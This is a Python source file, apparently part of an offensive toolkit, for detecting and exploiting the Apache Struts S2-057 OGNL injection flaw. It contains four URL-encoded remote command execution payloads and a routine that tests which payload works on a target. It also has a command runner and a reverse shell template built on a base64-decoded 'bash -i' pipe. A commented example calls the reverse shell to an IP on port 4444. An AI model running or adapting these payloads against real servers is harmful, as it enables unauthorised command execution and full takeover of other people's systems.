from exploit import tools
import random
import urllib.parse
from exploit.static_tools import handle_tools


class S2_057:
    """S2-057漏洞检测利用类"""
    info = "[+] S2-057:影响版本Struts 2.0.4-2.3.34, Struts 2.5.0-2.5.16; GET请求发送数据; 支持任意命令执行和反弹Linux shell"
    check_poc = "%24%7BNUM1%2BNUM2%7D"
    exec_payload1 = "%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D"
    exec_payload2 = "%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D"
    exec_payload3 = "%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D"
    exec_payload4 = "%24%7B%0A%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        if url.endswith(".action"):
            rindex = url.rindex('/')
            self.url = url[:rindex + 1]
            self.name = url[rindex + 1:]
        elif url.endswith("/"):
            self.url = url
            self.name = "index.action"
        else:
            self.url = url + '/'
            self.name = "index.action"
        self.headers = tools.parser_headers(headers)
        self.exec_payload = "exec_payload1"
        self.payload_dict = {"exec_payload1": self.exec_payload1, "exec_payload2": self.exec_payload2,"exec_payload3": self.exec_payload3, "exec_payload4": self.exec_payload4}
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        poc = self.check_poc.replace("NUM1", str(num1)).replace("NUM2", str(num2))
        url = self.url + poc + "/" + self.name
        html = tools.get_redirect(url, self.headers, self.encoding)
        if str(html).startswith("ERROR:"):
            return html
        if str(num1 + num2) in html:
            self.is_vul = True
            exec_payload = self.select_exec()
            if str(exec_payload).startswith("ERROR:"):
                return exec_payload
            else:
                return 'S2-057'
        return self.is_vul

    def select_exec(self):
        """选择可用的exp"""
        hash_str = handle_tools.get_hash()
        for k,v in self.payload_dict.items():
            payload = v.format(cmd=urllib.parse.quote("echo " + hash_str))
            url = self.url + payload + "/" + self.name
            html = tools.get_redirect(url, self.headers, self.encoding)
            if hash_str in html:
                self.exec_payload = k
                return
        return "ERROR: The vulnerability exists, but no payload is available!"

    def exec_cmd(self, cmd):
        """执行命令"""
        payload = self.payload_dict[self.exec_payload].format(cmd=urllib.parse.quote(cmd))
        url = self.url + payload + "/" + self.name
        html = tools.get_redirect(url, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = tools.reverse_shell(self, ip, port)
        return html

# if __name__ == '__main__':
#     s = S2_057("http://192.168.217.138:8080/S2-057/struts2-showcase/actionChain1.action")
#     tools._proxies = proxies = {
#         "http":"127.0.0.1:8080",
#         "https":"127.0.0.1:8080"
#     }
#     print(s.check())
#     print(s.exec_cmd("whoami"))
#     s.reverse_shell("192.168.3.134", "4444")